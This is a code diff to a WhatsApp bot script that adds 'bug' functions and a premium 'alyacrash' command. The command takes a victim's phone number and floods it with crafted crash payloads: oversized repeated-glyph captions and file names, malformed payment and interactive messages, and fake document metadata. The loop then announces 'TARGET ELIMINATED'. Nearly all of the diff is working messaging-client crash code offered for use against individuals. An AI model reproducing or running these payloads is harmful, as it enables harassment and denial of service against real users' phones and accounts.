@@ -1024,7 +1024,193 @@ const sendReaction = async reactionContent => {
                     }
                 );
             }
-//end bug functions
+const painbug = { 
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+message: {
+listResponseMessage: {
+title: `𝐐𝐮𝐞𝐞𝐧𖤛𝐀𝐥𝐲𝐚`
+}
+}
+}
+const force = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": anjay
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"Rias Crash",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+}
+async function ngeloc(target, kuwoted) {
+var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "p",
+    "degreesLongitude": "p",
+    "caption": `𝐀𝐥𝐲𝐚 𝐗 𝐂𝐫𝐚𝐬𝐡`+"ꦾ".repeat(50000),
+    "sequenceNumber": "0",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: target, quoted: kuwoted })
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
+}
+const Alyabug = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./src/data/function/ABug/xx1.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Pᴀɪɴᴢʏ\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
+}
+]
+}
+}
+}
+}
+
+const zpay = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+message: {
+requestPaymentMessage: {
+currencyCodeIso4217: 'USD',
+amount1000: 999,
+requestFrom: '0@s.whatsapp.net',
+noteMessage: {
+extendedTextMessage: {
+text: `Msg ${m.body || m.mtype}`
+}
+},
+expiryTimestamp: 999999999,
+amount: {
+value: 91929291929,
+offset: 1000,
+currencyCode: 'INR'
+}
+}
+}
+}
+
+const force2 = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: "status@broadcast"
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": fs.readFileSync(`./lib/image/latx.png`)
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍ CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》
+_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 
+𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈
+*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*
+
+𝗗𝗮𝘀𝗮𝗿 
+𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
+𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+
+}
+
+]
+
+}
+
+}
+
+}
+
+}
+
+
+async function bakdok(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  "documentMessage": {
+    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+    "mimetype": "penis",
+    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+    "fileLength": "999999999",
+    "pageCount": 999999999,
+    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+    "fileName": `𝐀𝐥𝐲𝐚 𝐂𝐫𝐚𝐬𝐡.doc`+"ྦྷ".repeat(60000),
+    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+    "mediaKeyTimestamp": "1715880173"
+  }
+}), { userJid: target, quoted: kuwoted });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function penghitaman(target, kuwoted) {
+ var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
+  "stickerMessage": {
+    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
+    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+    "mimetype": "image/webp",
+    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
+    "fileLength": "10116",
+    "mediaKeyTimestamp": "1715876003",
+    "isAnimated": false,
+    "stickerSentTs": "1715881084144",
+    "isAvatar": false,
+    "isAiSticker": false,
+    "isLottie": false
+  }
+}), { userJid: target, quoted: kuwoted });
+await AlyaBotInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
+}
+
+async function iponcrash(target) {
+await AlyaBotInc.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
+} 
+//=============={End of bug functions}============\\
 
         //premium
         async function replyprem(teks) {
@@ -20775,60 +20961,71 @@ m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\
 break
 //================{Bug Cases}===========\\
 case "alyacrash": {
-                        if (!isPremium) return replygcalya(mess.prem);
-                        if (!text)
-                            return replygcalya(
-                            `Use ${
-                            prefix + command
-                            } Victim number|total\nExample ${
-                            prefix + command
-                            } 23481xxxxxxxx,5`
-                        );
-                        let number = text.split(",")[0];
-                        let amount = text.split(",")[1] * 5;
-                        if (!number || !amount) {
-                            return replygcalya(
-                                `Use ${
-                                prefix + command
-                                } Victim number|total\nExample ${
-                                prefix + command
-                                } 23481xxxxxxxx,5`
-                            );
-                        }
-                        if (isNaN(parseInt(amount))) {
-                            return replygcalya("The amount must be a number");
-                        }
-                        let cleanedNumber = number.replace(/[^0-9]/g, "");
-                        let encodedAmount = "" + encodeURI(amount);
-                        var contactInfo = await AlyaBotInc.onWhatsApp(
-                            cleanedNumber + "@s.whatsapp.net"
-                        );
-                        let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
-                        if (cleanedNumber == "2349123721026") {
-                            return;
-                        }
-                        if (contactInfo.length == 0) {
-                            return replygcalya(
-                                "The number is not registered on WhatsApp"
-                            );
-                        }
-                        replygcalya(
-                            "please wait, " + command + " hack is in process.."
-                        );
-                        await sleep(2000); // Adjusted sleep time for clarity
-                        sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
-                        await sleep(2500); // Adjusted sleep time for clarity
-                        sendMessageWithMentions(
-                            "TARGET ELIMINATED ☠️ @" +
-                            whatsappNumber.split("@")[0] +
-                            " Using *" +
-                            command +
-                            "👑ALYA IS SUPREME 👑",
-                            [whatsappNumber]
-                        );
-                    }
+    if (!isPremium) return replygcalya(mess.prem);
+    if (!text) 
+        return replygcalya(
+        `Use ${prefix + command} Victim number\nExample ${prefix + command} 23481xxxxxxxx`
+    );
 
-                    break;
+    let number = text.split(",")[0];
+    let cleanedNumber = number.replace(/[^0-9]/g, "");
+    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
+
+    var contactInfo = await AlyaBotInc.onWhatsApp(whatsappNumber);
+
+    if (cleanedNumber == "2349123721026") {
+        return;
+    }
+
+    if (contactInfo.length == 0) {
+        return replygcalya("The number is not registered on WhatsApp");
+    }
+
+    replygcalya("please wait, " + command + " hack is in process..");
+    
+    for (let j = 0; j < 5; j++) { // Loop 5 times
+        await sendPaymentInfoMessage(whatsappNumber);
+        await bakdok(whatsappNumber, Alyabug);
+        await sendPaymentInfoMessage(whatsappNumber);
+        await sendPaymentInfoMessage(whatsappNumber, force2);
+        await bakdok(whatsappNumber, Alyabug);
+        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
+        await penghitaman(whatsappNumber, painbug);
+        await sendPaymentInfoMessage(whatsappNumber, zpay);
+        await iponcrash(whatsappNumber, force);
+        await sendPaymentInfoMessage(whatsappNumber, painbug);
+        await sendSystemCrashMessage(whatsappNumber, force);
+        await sendPaymentInfoMessage(whatsappNumber);
+        await iponcrash(whatsappNumber, Alyabug);
+        await sendPaymentInfoMessage(whatsappNumber, force);
+        await penghitaman(whatsappNumber, painbug);
+        await sendPaymentInfoMessage(whatsappNumber, Alyabug);
+        await sendPaymentInfoMessage(whatsappNumber, zpay);
+        await ngeloc(whatsappNumber, force);
+        await sendPaymentInfoMessage(whatsappNumber, zpay);
+        await bakdok(whatsappNumber, Alyabug);
+        await sendPaymentInfoMessage(whatsappNumber, force2);
+        await penghitaman(whatsappNumber, painbug);
+        await sendPaymentInfoMessage(whatsappNumber, force);
+        await sendPaymentInfoMessage(whatsappNumber, painbug);
+        await ngeloc(whatsappNumber, force2);
+
+        // Conditional check if required
+        if (j === 1) {
+            // Additional logic can go here
+        }
+    }
+
+    replygcalya(
+        "TARGET ELIMINATED ☠️ @" +
+        whatsappNumber.split("@")[0] +
+        " Using *" +
+        command +
+        "👑ALYA IS SUPREME 👑",
+        [whatsappNumber]
+    );
+}
+break;
 
                 case "oneshot":
                     {
@@ -21595,7 +21792,7 @@ await sleep(2000); // Adjusted sleep time for clarity
 sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
 await sleep(2500); // Adjusted sleep time for clarity
 sendMessageWithMentions(
-"TARGET🎯 ELIMINATED🕸☠️ @" +
+"TARGET KILLED ☠️ @" +
 whatsappNumber.split("@")[0] +
 " Using *" +
 command +
@@ -21607,7 +21804,7 @@ break;
 case "x-ios": {
 if (!isPremium) return replygcalya(mess.prem);
 if (!isBot) {
-return replygcalya("*Fitur ini hanya untuk bot!*");
+return replygcalya("*This feature is only for the bot!*");
 }
 if (!text) {
 return replygcalya(
